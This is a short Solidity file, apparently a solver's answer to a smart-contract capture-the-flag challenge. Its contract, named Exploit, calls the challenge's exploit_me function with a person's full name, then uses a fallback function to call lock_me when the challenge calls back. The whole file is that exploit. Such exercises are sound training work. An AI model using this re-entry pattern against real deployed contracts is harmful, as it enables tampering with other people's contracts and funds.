// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IChallenge {
    function exploit_me(string memory _name) external;
    function lock_me() external;
}

contract Exploit {
    IChallenge public immutable challenge;
    
    constructor(address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }
    
    function attack() external {
        // Using your full name as specified
        challenge.exploit_me("Progress Ochuko Eyaadah");
    }
    
    fallback() external {
        challenge.lock_me();
    }
}